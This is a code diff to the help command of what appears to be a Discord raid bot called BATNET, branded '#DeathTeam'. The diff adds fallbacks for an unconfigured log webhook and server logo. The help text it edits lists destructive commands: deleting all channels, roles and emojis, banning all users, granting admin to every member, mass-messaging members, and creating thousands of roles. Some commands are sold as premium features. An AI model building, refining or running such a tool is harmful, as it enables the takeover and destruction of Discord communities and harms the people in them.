@@ -30,7 +30,7 @@ async execute(client, message, args){
                               icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                          },
                          thumbnail: {
-                              url: util.server_logo
+                              url: util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless"
                          },
                          footer: {
                               text: '#DeathTeam',
@@ -41,13 +41,17 @@ async execute(client, message, args){
                     ]
           }
           
-          fetch(util.webhook_url, {
-               method: 'POST',
-               headers: {
-                    'Content-type': 'application/json'
-               },
-               body: JSON.stringify(log)
-          });
+          if (util.webhook_url !== "WEBHOOK") {
+               fetch(util.webhook_url, {
+                    method: 'POST',
+                    headers: {
+                         'Content-type': 'application/json'
+                    },
+                    body: JSON.stringify(log)
+               });
+          } else {
+               console.error(chalk.red(`\n[ BATNET ] Could not send log, Webhook not configured, configure it at: utilities\\ignore.json\n`));
+          }
           
           message.delete();
           
@@ -55,14 +59,14 @@ async execute(client, message, args){
           
           message.channel.send({
                embed: {
-                    description: `${emojis.bat} **| Non-Premium.**\n\n*.fuck* ‐ Execute all the non-premium bot commands.\n*.help* ‐ Send a embed with the commands,\n*.nuke* ‐ Delete all channels leaving only one for the rest of the commands.\n*.raid* ‐ *Raid the guild at once.*\n*.banall* ‐ Ban all possible users\n*.emojis* ‐ Erase all the emojis on the guild.\n*.invite* ‐ Invite the bot to a guild.\n*.admin* ‐ Give administrator perms to the server.\n*.leave* ‐ Leave the guild.\n*.admin_all* ‐ Give administrator perms to all the members on the guild.\n\n${emojis.boost} **| Premium**\n\n*.end* ‐ Execute the best bot commands, including the premium and non-premium\n*.clean* ‐ Delete all the channels, roles and emojis of the server.\n*.mdall* ‐ Send a direct message to all possible members.\n*.crole* ‐ Create thousands of roles on the guild.\n*.drole* ‐ Delete all the roles on the guild.`,
+                    description: `${emojis.bat} **| Non-Premium.**\n\n*.fuck* ‐ Execute all the non-premium bot commands.\n*.help* ‐ Send a embed with the commands,\n*.nuke* ‐ Delete all channels leaving only one for the rest of the commands.\n*.raid* ‐ *Raid the guild at once.*\n*.banall* ‐ Ban all possible users\n*.emojis* ‐ Erase all the emojis on the guild.\n*.invite* ‐ Invite the bot to a guild.\n*.admin* ‐ Obtain administrator on the server.\n*.leave* ‐ Leave the guild.\n*.admin_all* ‐ Give administrator perms to all the members on the guild.\n\n${emojis.boost} **| Premium**\n\n*.end* ‐ Execute the best bot commands, including the premium and non-premium\n*.clean* ‐ Delete all the channels, roles and emojis of the server.\n*.mdall* ‐ Send a direct message to all possible members.\n*.crole* ‐ Create thousands of roles on the guild.\n*.drole* ‐ Delete all the roles on the guild.`,
                     author: {
                               name: 'Help',
                               url: 'https://discord.gg/DeathTeam',
                               icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                          },
                          thumbnail: {
-                              url: util.server_logo
+                              url: util.server_logo !== "SERVER LOGO" ? util.server_logo : "https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless"
                          },
                          footer: {
                               text: '#DeathTeam',
